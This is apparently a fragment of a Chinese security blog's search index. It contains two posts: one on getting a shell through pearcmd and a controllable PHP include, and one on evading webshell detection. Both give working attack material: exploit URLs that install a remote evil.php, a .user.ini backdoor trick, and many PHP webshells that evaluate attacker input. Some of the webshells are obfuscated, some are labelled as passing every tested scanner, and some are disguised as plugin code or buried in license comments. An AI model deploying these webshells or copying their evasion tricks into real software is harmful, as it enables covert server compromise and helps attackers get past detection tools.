\u53ef\u4ee5\u77e5\u9053argv\u901a\u8fc7query_string\u53d6\u503c,\u5e76\u901a\u8fc7+\u4f5c\u4e3a\u5206\u5272\u7b26,\u5c1d\u8bd5\u4e00\u4e0b:","title":"\u5982\u4f55\u63a7\u5236$_SERVER['argv']"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u56de\u5230\u9898\u76ee","text":"\u73b0\u5728\u56de\u5230\u9898\u76ee,\u6211\u4eec\u6240\u6709\u7684\u62fc\u56fe\u5df2\u7ecf\u51d1\u9f50\u4e86,\u5047\u5982\u5b58\u5728\u4ee5\u4e0b\u73af\u5883: \u5b89\u88c5\u4e86pear \u5f00\u542f\u4e86register argc argv \u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662f include $_GET['f'].php ) \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u77e5\u8bc6\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4ece\u800cgetshell: // web\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php - http://ip:port/tmp/pear/download/evil.php // tmp\u76ee\u5f55\u53ef\u5199 - http://ip:port/include.php?f=pearcmd&+install+-R+/tmp+http://ip:port/evil.php - http://ip:port/include.php?f=/tmp/pear/download/evil","title":"\u56de\u5230\u9898\u76ee"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u540e\u95e8","text":"\u524d\u9762\u63d0\u5230register argc argv\u662fPHP INI PERDIR\u7684,\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u65b0\u5efa\u4e00\u4e2a.user.ini\u8bbe\u7f6eregister argc argv\u4e3aOn\u7528\u4e8e\u7559\u540e\u95e8","title":"\u540e\u95e8"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%E9%99%90%E5%88%B6php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%B0%8F%E7%BB%93/#\u6700\u540edocker","text":"\u5728php\u5b98\u65b9\u63d0\u4f9b\u7684\u955c\u50cf\u4e0b,\u9ed8\u8ba4\u662f\u4e0d\u4f7f\u7528php.ini\u7684(\u5728/usr/local/etc/php\u4e2d\u5b58\u5728php.ini-production\u548cphp.ini-development,\u9700\u8981\u624b\u52a8\u4fee\u6539\u4efb\u610f\u4e00\u4e2a\u6587\u4ef6\u540d\u4e3aphp.ini\u624d\u4f1a\u542f\u52a8php.ini,\u800c\u4e0a\u9762\u6211\u4eec\u63d0\u5230\u5728php.ini\u4e2dregister argc argv\u90fd\u8bbe\u7f6e\u4e3aOff) \u800cregister argc argv\u5728\u4e0d\u8bbe\u7f6e\u7684\u60c5\u51b5\u4e0b\u9ed8\u8ba4\u4e3aOn,\u90a3\u4e48\u5047\u5982\u6709\u4e00\u4e2a\u9ed8\u8ba4\u7684docker-php\u73af\u5883,\u5e76\u5b58\u5728\u53ef\u63a7\u7684 include $_GET['f'] (\u5373\u4f7f\u662finclude $_GET['f'].php),\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u6f0f\u6d1e\u5b9e\u73b0getshell","title":"\u6700\u540e:docker"},{"location":"%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/","text":"webshell\u514d\u6740\u603b\u7ed3 # \u4ee5\u4e0b\u5185\u5bb9\u57fa\u4e8ePHP7 \u6700\u8fd1\u5bf9webshell\u7684\u514d\u6740\u673a\u5236\u4ea7\u751f\u4e86\u6d53\u539a\u7684\u5174\u8da3,\u4e8e\u662f\u5f00\u59cb\u8fdb\u884c\u7814\u7a76,\u53c2\u8003\u4e86\u7f51\u4e0a\u8bb8\u8bb8\u591a\u591a\u7684\u6587\u7ae0,\u4ee5\u4e0b\u662f\u6211\u5bf9webshell\u514d\u6740\u7684\u4e00\u4e9b\u603b\u7ed3 \u4f7f\u7528\u4ee5\u4e0b\u7f51\u7ad9\u53ca\u514d\u6740\u5de5\u5177\u8fdb\u884c\u514d\u6740\u6d4b\u8bd5(\u5e26\u661f\u53f7\u7684\u8868\u793a\u6211\u8ba4\u4e3a\u68c0\u6d4b\u6548\u679c\u6bd4\u8f83\u597d\u7684\u5de5\u5177/\u7f51\u7ad9): webshellchop \u957f\u4ead(*) \u6df1\u5ea6\u5b66\u4e60 WEBDIR+ \u767e\u5ea6(*) \u6cb3\u9a6c\u5728\u7ebf\u67e5\u6740 D\u76fe \u5b89\u5168\u72d7 \u53c2\u8003\u6587\u7ae0: https://www.freebuf.com/articles/web/155891.html https://bbs.symbo1.com/t/topic/94 https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html https://xz.aliyun.com/t/5152 http://webshell.cdxy.me/ \u4e0b\u7684\u8bc4\u8bba ... \u514d\u6740\u6280\u672f\u57fa\u7840 # \u524d\u8a00 # \u5bf9\u4e8ewebshell\u7684\u514d\u6740\u800c\u8a00,PHP5\u4e0ePHP7\u6709\u5f88\u5927\u7684\u4e0d\u540c,\u5728PHP7\u4e4b\u540e,assert\u8fd9\u4e2a\u9a6c\u513f\u5e38\u7528\u7684\u51fd\u6570\u53d8\u6210\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8eeval\u7684\u8bed\u6cd5\u6784\u9020,\u8fd9\u4f7f\u5f97\u6211\u4eec\u65e0\u6cd5\u901a\u8fc7\u52a8\u6001\u51fd\u6570\u7684\u65b9\u5f0f\u6765\u8c03\u7528assert,\u8fd9\u65e0\u7591\u662f\u5bf9\u514d\u6740\u7684\u4e00\u6b21\u6c89\u91cd\u6253\u51fb.(\u7ecf\u8fc7\u4e25\u683c\u6d4b\u8bd5,\u5728PHP7.0.33\u4e2d\u4f9d\u7136\u53ef\u4ee5,\u731c\u6d4b\u5e94\u8be5\u662fPHP7.1\u4ee5\u540e),\u56e0\u6b64\u6211\u4eec\u9700\u8981\u8f6c\u53d8\u601d\u8def\u4e86.\u6807\u6709(ALLKILL)\u5b57\u6837\u7684webshell\u901a\u8fc7\u4e86\u672c\u6587\u63d0\u5230\u7684\u6240\u6709\u67e5\u6740 \u53e6\u7c7b\u7684\u5165\u53e3 # \u6211\u4eec\u5e38\u89c1\u7684webshell\u5165\u53e3\u90fd\u662f GET, POST\u4e4b\u7c7b\u7684,\u4f46\u662f\u5176\u5b9e\u4e00\u5207\u7684\u5165\u53e3\u6211\u4eec\u90fd\u53ef\u4ee5\u8fdb\u884c\u5229\u7528,\u4ee5\u6b64\u6765\u9003\u8fc7\u67e5\u6740: $_GET $_POST $_COOKIE $_REQUEST $ SERVER \u5176\u4e2d\u7684\u67d0\u4e9b\u53c2\u6570\u53ef\u63a7,\u5982REQUEST METHOD,QUERY STRING,HTTP USER_AGENT\u7b49 session_id() \u8fd9\u4e2a\u6bd4\u8f83\u7279\u6b8a,\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u5229\u7528 $_FILE $GLOBALS getallheaders() get defined vars() get defined functions() \u4e0b\u9762\u4e3e\u51e0\u4e2a\u4f8b\u5b50: <?php @ eval ( urldecode ( $_FILES [ 'file' ][ 'name' ])); // \u8be5\u9a6c\u4f1a\u628a\u53cc\u5f15\u53f7\u7ed9URL\u7f16\u7801, // \u56e0\u6b64\u5982\u679cpayload\u4e2d\u6709\u53cc\u5f15\u53f7\u5219\u9700\u8981\u5957\u4e00\u5c42urldecode @ eval ( urldecode ( $_FILES [ 'file' ][ 'type' ])); // \u8be5p\u9a6c\u4f1a\u628a\u5206\u53f7\u5403\u6389,\u56e0\u6b64\u9700\u8981\u5bf9\u5206\u53f7\u8fdb\u884c\u7f16\u7801\u5982URL\u7f16\u7801(%3B) //\u56e0\u6b64\u9700\u8981\u5957\u4e00\u5c42urldecode ?> <?php @ eval ( hex2bin ( $_SERVER [ 'REQUEST_METHOD' ])); // \u8be5\u9a6c\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u65b9\u5f0f\u6765\u5b9e\u73b0\u6267\u884c,\u7531\u4e8e\u7b26\u53f7\u95ee\u9898 // \u9700\u8981\u7528bin2hex\u5bf9payload\u8fdb\u884c\u7f16\u7801 ?> <?php $a = $_SERVER [ 'QUERY_STRING' ]; //\u4f8b\u5b50 ?php=info()& $a = str_replace ( \"&\" , \";\" , $a ); $a = str_replace ( \"=\" , \"\" , $a ); @ eval ( $a ); ?> <?php @ eval ( getallheaders ()[ 'Referer' ]); <?php // (ALLKILL) error_reporting ( 0 ); eval ( null . implode ( reset ( get_defined_vars ()))); // php>=5.5 ?a=echo 1; ?> <?php // (ALLKILL) error_reporting ( 0 ); define ( \"SS\" , \"session_start\" ); function result ( $arg ) { return 1 > 0 ? @ $arg : 0 ; } function hex22bin ( $data ) { $len = strlen ( $data ); return pack ( \"H\" . $len , $data ); } class deal { function combine_var ( $default = NULL ){ if ( ! constant ( \"SS\" )) { return $default ; } if ( ! preg_match ( '/\\w+/' , $this -> sess )) { throw new Exception ( \" $this->sess error\" ); } $results = null ; //trash $results = result ( $this -> sess ); @ eval ( \" $this->sess \" ); // PHP>=5.4 // Cookie: PHPSESSID=706870696e666f28293b == phpinfo(); hex2bin(\"phpinfo();\") => 706870696e666f28293b } function __construct ( $arg ){ $this -> sess = $arg ; return $this -> combine_var (); } } $son = constant ( \"SS\" ); $son (); $sessionid = session_id (); $sessionid = hex22bin ( $sessionid ); $deals = new deal ( $sessionid ); ?> \u5176\u4e2d\u6bd4\u8f83\u503c\u5f97\u6ce8\u610f\u7684\u662fGLOBALS,get defined vars(),getallheaders() GLOBALS,get defined vars(): \u4e00\u4e2a\u662f\u8d85\u5168\u5c40\u53d8\u91cf,\u4e00\u4e2a\u662f\u51fd\u6570,\u8fd4\u56de\u503c\u90fd\u662f\u4e00\u4e2a\u591a\u7ef4\u6570\u7ec4,\u5305\u542b\u4e86 GET, POST\u7b49\u5176\u4ed6\u8d85\u5168\u5c40\u53d8\u91cf,\u53ef\u4ee5\u501f\u6b64\u6765\u5bf9\u88f8\u9732\u7684\u8f93\u5165\u8fdb\u884c\u5d4c\u5957,\u5982\u7528GLOBALS[' POST'][1]\u4ee3\u66ff POST[1] getallheaders(): \u83b7\u53d6\u6240\u6709\u7684\u8bf7\u6c42\u5934(\u8be5\u51fd\u6570\u62e5\u6709\u4e00\u4e9b\u9650\u5236,\u5177\u4f53\u8bf7\u53c2\u7167 \u8fd9\u91cc ) \u540c\u6837\u53ef\u4ee5\u501f\u6b64\u6765\u5c1d\u8bd5\u9003\u8fc7\u5bf9\u8f93\u5165\u7684\u68c0\u67e5 \u8fd9\u91cc\u518d\u8bf4\u51e0\u4e2aPHP\u7684\u51fd\u6570 pos(),current(),reset():\u8fd9\u4e09\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u90fd\u662f\u4f20\u5165\u6570\u7ec4\u7684\u4e00\u4e2a\u5143\u7d20 next():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u7b2c\u4e8c\u4e2a\u5143\u7d20 end():\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u662f\u4f20\u5165\u6570\u7ec4\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20 implode():\u53ef\u4ee5\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u62fc\u63a5\u8d77\u6765,\u5982\u62fc\u63a5\u6210\u5b57\u7b26\u4e32 \u53ef\u4ee5\u770b\u5230 evil5.php \u4e2d\u6211\u4eec\u4ec5\u4ec5\u5bf9\u8f93\u5165\u8fdb\u884c\u5904\u7406,\u62fc\u63a5null\u5c31\u8eb2\u8fc7\u4e86\u6240\u6709\u7684\u67e5\u6740. \u9664\u4e86\u4e0a\u8ff0\u65b9\u6cd5\u4e4b\u5916,\u6211\u4eec\u4e5f\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u4e0d\u540c\u7684\"\u95e8\"\u8fdb\u5165,\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4: system() exec() shell_exec() passthru() proc_open() `` // \u53cd\u5f15\u53f7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 \u6216\u8005\u4f7f\u7528\u4e00\u4e9b\u533f\u540d\u51fd\u6570,\u52a8\u6001\u8c03\u7528\u51fd\u6570,\u56de\u8c03\u51fd\u6570: call user func call user func_array array_filter array_map uasort, uksort array_reduce array_udiff array_walk array walk recursive preg replace, mb ereg_replace preg_filter register shutdown function register tick function filter_var filter var array \u7c7b\u7684\u53cd\u5c04->invoke() include file get contents create function // \u6211\u5c1d\u8bd5\u7528create function\u6765\u521b\u9020\u514d\u6740webshell,\u4f46\u4f3c\u4e4e\u603b\u662f\u7ed5\u4e0d\u8fc7\u957f\u4ead <?php // (ALLKILL) error_reporting ( 0 ); function compare_by_area ( $a , $b ) { $areaA = substr ( $a -> width . $a -> height , 4 ); $areaB = substr ( $b -> width . $b -> height , 4 ); if ( $areaA ( $areaB )) { return - 1 ; } elseif ( $areaA == $areaB ) { return 1 ; } else { return 0 ; } } $array1 = array ( new stdclass ); $array1 [ 0 ] -> width = 'code' ; $array1 [ 0 ] -> height = 'sys' . 'tem' ; $array2 = array ( new stdclass ); $array2 [ 0 ] -> width = 'args' ; $array2 [ 0 ] -> height = pos ( next ( $GLOBALS )); array_udiff ( $array1 , $array2 , 'compare_by_area' ); // PHP >=5.3 \u603b\u7684\u6765\u8bf4,\u5165\u53e3\u5343\u4e07\u6761,\u5b89\u5168\u7b2c\u4e00\u6761,\u514d\u6740\u4e0d\u5230\u4f4d,\u9762\u58c1\u7a7a\u6d41\u6cea.\u5404\u4f4d\u5e08\u5085\u4eec\u53ef\u4ee5\u81ea\u884c\u6d4b\u8bd5\u4e0b\u8fd9\u4e9b\u5165\u53e3 \u53d8\u5f62\u4e0e\u4f2a\u88c5 # \u53d8\u5f62\u53ef\u80fd\u662f\u6211\u4eec\u6700\u5e38\u89c1\u7684bypass\u624b\u6bb5\u4e86,\u4f46\u4ecd\u7136\u662f\u6211\u4eec\u901a\u8fc7\u52a8\u6001\u68c0\u6d4b\u7684\u597d\u624b\u6bb5,PHP\u4e2d\u81ea\u5e26\u4e86\u5927\u91cf\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u5904\u7406\u53d8\u5f62\u4e0e\u7f16\u7801\u7684\u51fd\u6570,\u6211\u4eec\u53ef\u4ee5\u501f\u6b64\u5bf9\u6211\u4eec\u7684webshell\u8fdb\u884c\u64cd\u4f5c \u4ee5\u4e0b\u662f\u4e00\u4e9bPHP\u81ea\u5e26\u7684\u51fd\u6570: substr_replace substr strtr str_rot13 base64_encode chr bin2hex strrev urlencode json_encode pack gzcompress/gzdeflate/gzencode ... \u53e6\u5916\u6211\u4eec\u8fd8\u53ef\u4ee5\u901a\u8fc7\u5341\u516d\u8fdb\u5236/\u516b\u8fdb\u5236\u7f16\u7801,\u53d6\u53cd\uff0c\u5f02\u6216\uff0c\u52a0\u5bc6\uff0c\u5e8f\u5217\u5316,\u51fd\u6570\u540d\u5927\u5c0f\u5199\u7b49\u7b49\u6765\u5bf9webshell\u8fdb\u884c\u53d8\u5f62,\u4f8b\u5982\u5229\u7528\u5341\u516d\u8fdb\u5236\u4e0e\u516b\u8fdb\u5236\u6df7\u7f16\u7684ALLKILL webshell: <?php // (ALLKILL) \u53c2\u8003https://www.freebuf.com/articles/web/155891.html\u4e2d\u8fdb\u5236\u8f6c\u6362\u65b9\u5f0f $v230c590 = \" \\x62\\x61\\163\\x65\\x36\\x34\\137\\144\\145\\x63\\x6f\\144\\145 \" ; @ eval ( '' . $v230c590 ( null . next ( post ( $GLOBALS )); \u53c8\u5982\u5229\u7528\u9762\u5411\u5bf9\u8c61\u7279\u6027,\u5b57\u7b26\u62fc\u63a5,\u52a8\u6001\u8c03\u7528\u53d8\u5f62\u7684ALLKILL webshell: <?php // (ALLKILL) $name = basename ( __FILE__ ); class combine { function __construct ( $var , $srcname ) { $this -> var = $var ; $this -> name = $srcname ; $this -> cookie = get_class ( $this ); $this -> cookie = $this -> cookie [ 2 ]; } function __combine ( $yum ) { $run = $this -> var ; $run .= $this -> name [ 3 ]; $run .= 'e' . $this -> cookie ; $this -> yum = $yum ; $run ( '' . $this -> yum ); } } $result = new combine ( 'sys' , $name ); // php5 php7 success die ( $result -> __combine ( $_GET [ 2333 ])); \u4f2a\u88c5\u5219\u662f\u4e00\u79cd\u6709\u6548\u901a\u8fc7\u9759\u6001\u68c0\u6d4b\u7684\u65b9\u6cd5(\u867d\u7136\u6709\u70b9\u7384\u5b66,\u4f8b\u5982D\u76fe\u4f3c\u4e4e\u6709\u5bf9\u6587\u4ef6\u884c\u6570\u8fdb\u884c\u5224\u65ad),\u6211\u4eec\u5c06webshell\u4f2a\u88c5\u6210\u4e00\u4e2a\u6b63\u5e38\u7684\u529f\u80fd,\u5e76\u914d\u4e0a\u63a9\u4eba\u8033\u76ee\u7684\u540d\u5b57,\u751a\u81f3\u53ef\u4ee5\u9003\u8fc7\u7ba1\u7406\u5458\u7684\u68c0\u67e5,\u4f8b\u5982\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50: <?php /** * new plugin * @author xxcms * @package Glimmer * @subpackage PluginsShared */ /** * get a compiler parameter and echo to console */ function get_compiler_param ( $params , $index , $default = null ) { if ( ! isset ( $params [ $index ])) { return $default ; } if ( ! preg_match ( '/^([\\'\"]?)[a-zA-Z0-9](\\\\1)/' , $params [ $index ])) { throw new Exception ( \" $index is not a literal\" ); } $t = null ; eval ( \" \\$ t = \" . $params [ $index ]); return $t ; } $params = array ( 'code' => $_GET [ 2333 ]); $a = get_compiler_param ( $params , 'code' , \"whoami\" ); if ( isset ( $_GET [ 'print' ])){ echo ( \"<script>console.log('\" . $a . \"');</script>\" ); } <?php // \u8fd9\u4e2a\u9a6c\u7531\u4e8eextract\u53ca\u660e\u663e\u7684\u52a8\u6001\u8c03\u7528\u8fc7\u4e0d\u4e86\u514d\u6740,\u4f46\u662f\u4ecd\u4e0d\u5931\u4e3a\u4e00\u79cd\u597d\u601d\u8def // copy from http://webshell.cdxy.me/ /* GNU GENERAL PUBLIC LICENSE Version 3, 29 June 2007 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/> Everyone is permitted to copy and distribute verbatim copies of this license document, but changing it is not allowed. Preamble The GNU General Public License is a free, copyleft license for software and other kinds of works. The licenses for most software and other practical works are designed to take away your freedom to share and change the works. By contrast, the GNU General Public License is intended to guarantee your freedom to share and change all versions of a program--to make sure it remains free software for all its users. We, the Free Software Foundation, use the GNU General Public License for most of our software; it applies also to any other work released this way by its authors. You can apply it to your programs, too. When we speak of free software, we are referring to freedom, not price. Our General Public Licenses are designed to make sure that you have the freedom to distribute copies of free software (and charge for them if you wish), that you receive source code or can get it if you want it, that you can change the software or use pieces of it in new free programs, and that you know you can do these things. To protect your rights, we need to prevent others from denying you these rights or asking you to surrender the rights. Therefore, you have certain responsibilities if you distribute copies of the software, or if you modify it: responsibilities to respect the freedom of others. For example, if you distribute copies of such a program, whether gratis or for a fee, you must pass on to the recipients the same freedoms that you received. You must make sure that they, too, receive or can get the source code. And you must show them these terms so they know their rights. Developers that use the GNU GPL protect your rights with two steps: (1) assert copyright on the software, and (2) offer you this License giving you */ extract ( $_COOKIE ); /* copy, distribute and/or modify it. For the developers' and authors' protection, the GPL clearly explains that there is no warranty for this free software. For both users' and authors' sake, the GPL requires that modified versions be marked as changed, so that their problems will not be attributed erroneously to authors of previous versions. Some devices are designed to deny users access to install or run modified versions of the software inside them, although the manufacturer can do so. This is fundamentally incompatible with the aim of protecting users' freedom to change the software. The systematic pattern of such abuse occurs in the area of products for individuals to use, which is precisely where it is most unacceptable. Therefore, we have designed this version of the GPL to prohibit the practice for those products. If such problems arise substantially in other domains, we stand ready to extend this provision to those domains in future versions of the GPL, as needed to protect the freedom of users. Finally, every program is threatened constantly by software patents. States should not allow patents to restrict development and use of software on general-purpose computers, but in those that do, we wish to avoid the special danger that patents applied to a free program could make it effectively proprietary. patents applied to GPL assures that patents cannot be used to render the program non-free. The precise terms and conditions for copying, distribution and modification follow. TERMS AND CONDITIONS 0. Definitions. \"This License\" refers to version 3 of the GNU General Public License. \"Copyright\" also means copyright-like laws that apply to other kinds of works, such as semiconductor masks. \"The Program\" refers to any copyrightable work licensed under this License. Each licensee is addressed as \"you\". \"Licensees\" and \"recipients\" may be individuals or organizations. To \"modify\" a work means to copy from or adapt all or part of the work in a fashion requiring copyright permission, other than the making of an exact copy. The resulting work is called a \"modified version\" of the earlier work or a work \"based on\" the earlier work. A \"covered work\" means either the unmodified Program or a work based on the Program. To \"propagate\" a work means to do anything with it that, without permission, would make you directly or secondarily liable for infringement under applicable copyright law, except executing it on a computer or modifying a private copy. Propagation includes copying, distribution (with or without modification), making available to the public, and in some countries other activities as well. To \"convey\" a work means any kind of propagation that enables other parties to make or receive copies. Mere interaction with a user through a computer network, with no transfer of a copy, is not conveying. An interactive user interface displays \"Appropriate Legal Notices\" to the extent that it includes a convenient and prominently visible feature that (1) displays an appropriate copyright notice, and (2) tells the user that there is no warranty for the work (except to the extent that warranties are provided), that licensees may convey the work under this License, and how to view a copy of this License. If the interface presents a list of user commands or options, such as a menu, a prominent item in the list meets this criterion. 1. Source Code. The \"source code\" for a work means the preferred form of the work for making modifications to it. \"Object code\" means any non-source form of a work. A \"Standard Interface\" means an interface that either is an official standard defined by a recognized standards body, or, in the case of interfaces specified for a particular programming language, one that is widely used among developers working in that language. The \"System Libraries\" of an executable work include anything, other than the work as a whole, that (a) is included in the normal form of packaging a Major Component, but which is not part of that Major Component, and (b) serves only to enable use of the work with that Major Component, or to implement a Standard Interface for which an implementation is available to the public in source code form. A \"Major Component\", in this context, means a major essential component (kernel, window system, and so on) of the specific operating system (if any) on which the executable work runs, or a compiler used to produce the work, or an object code interpreter used to run it. The \"Corresponding Source\" for a work in object code form means all the source code needed to generate, install, and (for an executable work) run the object code and to modify the work, including scripts to control those activities. However, it does not include the work's System Libraries, or general-purpose tools or generally available free programs which are used unmodified in performing those activities but which are not */ @ $PC4E20 &&@ $F ( $A , $B ); /*. For example, Corresponding Source the work, and the source code for shared libraries and dynamically linked subprograms that the work is specifically designed to require, such as by intimate data communication or control flow between those subprograms and other parts of the work. The Corresponding Source need not include anything that users can regenerate automatically from other parts of the Corresponding Source. The Corresponding Source for a work in source code form is that same work. 2. Basic Permissions. All rights granted under this License are granted for the term of copyright on the Program, and are irrevocable provided the stated conditions are met. This License explicitly affirms your unlimited permission to run the unmodified Program. The output from running a covered work is covered by this License only if the output, given its content, constitutes a covered work. This License acknowledges your rights of fair use or other equivalent, as provided by copyright law. You may make, run and propagate covered works that you do not convey, without conditions so long as your license otherwise remains in force. You may convey covered works to others for the sole purpose of having them make modifications exclusively for you, or provide you with facilities for running those works, provided that you comply with the terms of this License in conveying all material for which you do not control copyright. Those thus making or running the covered works for you must do so exclusively on your behalf, under your direction and control, on terms that prohibit them from making any copies of your copyrighted material outside their relationship with you. Conveying under any other circumstances is permitted solely under the conditions stated below. Sublicensing is not allowed; section 10 makes it unnecessary. */ ?> \u4e5f\u8bb8\u4e0a\u9762\u7684\u65b9\u6cd5\u53ea\u4f7f\u7528\u4e00\u79cd\u7684\u8bdd\u65e0\u6cd5\u8fbe\u5230\u514d\u6740\u7684\u76ee\u7684,\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5d4c\u5957\u4f7f\u7528,\u5982\u5b9a\u4e49\u4e00\u4e2a\u51fd\u6570/\u7c7b,\u5728\u91cc\u9762\u8fdb\u884c\u8c03\u7528 <?php // copy from https://xz.aliyun.com/t/5152 function test ( $a , $b ){ array_map ( $a , $b ); } test ( assert , array ( $_POST [ 'x' ])); ?> <?php // copy from https://xz.aliyun.com/t/5152 class loveme { var $a ; var $b ; function __construct ( $a , $b ) { $this -> a = $a ; $this -> b = $b ; } function test () { array_map ( $this -> a , $this -> b ); } } $p1 = new loveme ( assert , array ( $_POST [ 'x' ])); $p1 -> test (); ?> \u7b26\u53f7\u5e72\u6270 # \u8fd9\u79cd\u65b9\u6cd5\u901a\u5e38\u7528\u4e8e\u5e72\u6270\u67e5\u6740\u7684\u6b63\u5219\u5224\u65ad,\u53ef\u4ee5\u4f7f\u7528\u7684\u7b26\u53f7\u6709null,\\n,\\r,\\t\u7b49 \u5e38\u7528\u7684\u65b9\u5f0f\u662f\u5c06\u8fd9\u4e9b\u5b57\u7b26\u4e0e\u5b57\u7b26\u4e32\u8fdb\u884c\u62fc\u63a5,\u5982\u679c\u4f60\u7684webshell\u88ab\u6740\u4e86,\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e0b, \u5982: <?php // copy from https://xz.aliyun.com/t/5152 $a = $_REQUEST [ 'a' ]; $b = null ; eval ( $b . $a ); ?> <?php // copy from https://xz.aliyun.com/t/5152 $a = $_POST [ 'a' ]; $b = \" \\n \" ; eval ( $b .= $a ); ?> \u8fd8\u6709\u4e00\u79cd\u6bd4\u8f83\u9a9a\u7684\u59ff\u52bf\u5728\u51fd\u6570\u8c03\u7528\u4e2d\u662f\u63d2\u5165\u4e00\u4e9b\u63a7\u5236\u7b26 [\\x00-\\x20] ,PHP\u5f15\u64ce\u4f1a\u5ffd\u7565\u8fd9\u4e9b\u63a7\u5236\u5b57\u7b26,\u6b63\u786e\u6267\u884cPHP\u51fd\u6570,\u5982: <?php // copy from https://bbs.symbo1.com/t/topic/94 eval \\x01\\x02 ( $_POST [ 2333 ]); //\u8fd9\u91cc\\x01\u4e0e\\x02\u8981\u8f6c\u6362\u4e3a\u5b9e\u9645\u7684\u5b57\u7b26 \u522b\u540d/\u91cd\u547d\u540d # \u5176\u5b9ePHP\u4e2d\u662f\u6709\u5f88\u591a\u51fd\u6570\u522b\u540d\u7684,\u5982pos\u662fcurrent\u7684\u522b\u540d,\u5728PHP5.6\u52a0\u5165\u4e86\u51fd\u6570\u540d\u7684\u547d\u540d\u7a7a\u95f4\u4e4b\u540e\u6211\u4eec\u751a\u81f3\u53ef\u4ee5\u81ea\u5df1\u521b\u9020\"\u522b\u540d\". \u8fd9\u91cc\u9644\u4e00\u4e2aPHP7.4.3\u4e2d\u51fd\u6570\u522b\u540d\u8868(\u4e2a\u4eba\u6574\u7406,\u53ef\u80fd\u4f1a\u6709\u9519/\u6f0f) bzwrite->fwrite bzflush->fflush bzclose->fclose isId->dom_attr_is_id substringData->dom_characterdata_substring_data appendData->dom_characterdata_append_data insertData->dom_characterdata_insert_data deleteData->dom_characterdata_delete_data replaceData->dom_characterdata_replace_data createElement->dom_document_create_element createDocumentFragment->dom_document_create_document_fragment createTextNode->dom_document_create_text_node createComment->dom_document_create_comment createCDATASection->dom_document_create_cdatasection createProcessingInstruction->dom_document_create_processing_instruction createAttribute->dom_document_create_attribute createEntityReference->dom_document_create_entity_reference getElementsByTagName->dom_document_get_elements_by_tag_name importNode->dom_document_import_node createElementNS->dom_document_create_element_ns createAttributeNS->dom_document_create_attribute_ns getElementsByTagNameNS->dom_document_get_elements_by_tag_name_ns getElementById->dom_document_get_element_by_id adoptNode->dom_document_adopt_node normalizeDocument->dom_document_normalize_document renameNode->dom_document_rename_node save->dom_document_save saveXML->dom_document_savexml validate->dom_document_validate xinclude->dom_document_xinclude saveHTML->dom_document_save_html saveHTMLFile->dom_document_save_html_file schemaValidate->dom_document_schema_validate_file schemaValidateSource->dom_document_schema_validate_xml relaxNGValidate->dom_document_relaxNG_validate_file relaxNGValidateSource->dom_document_relaxNG_validate_xml setParameter->dom_domconfiguration_set_parameter getParameter->dom_domconfiguration_get_parameter canSetParameter->dom_domconfiguration_can_set_parameter handleError->dom_domerrorhandler_handle_error item->dom_domimplementationlist_item getDomimplementation->dom_domimplementationsource_get_domimplementation getDomimplementations->dom_domimplementationsource_get_domimplementations item->dom_domstringlist_item getAttribute->dom_element_get_attribute setAttribute->dom_element_set_attribute removeAttribute->dom_element_remove_attribute getAttributeNode->dom_element_get_attribute_node setAttributeNode->dom_element_set_attribute_node removeAttributeNode->dom_element_remove_attribute_node getElementsByTagName->dom_element_get_elements_by_tag_name getAttributeNS->dom_element_get_attribute_ns setAttributeNS->dom_element_set_attribute_ns removeAttributeNS->dom_element_remove_attribute_ns getAttributeNodeNS->dom_element_get_attribute_node_ns setAttributeNodeNS->dom_element_set_attribute_node_ns getElementsByTagNameNS->dom_element_get_elements_by_tag_name_ns hasAttribute->dom_element_has_attribute hasAttributeNS->dom_element_has_attribute_ns setIdAttribute->dom_element_set_id_attribute setIdAttributeNS->dom_element_set_id_attribute_ns setIdAttributeNode->dom_element_set_id_attribute_node getNamedItem->dom_namednodemap_get_named_item setNamedItem->dom_namednodemap_set_named_item removeNamedItem->dom_namednodemap_remove_named_item item->dom_namednodemap_item 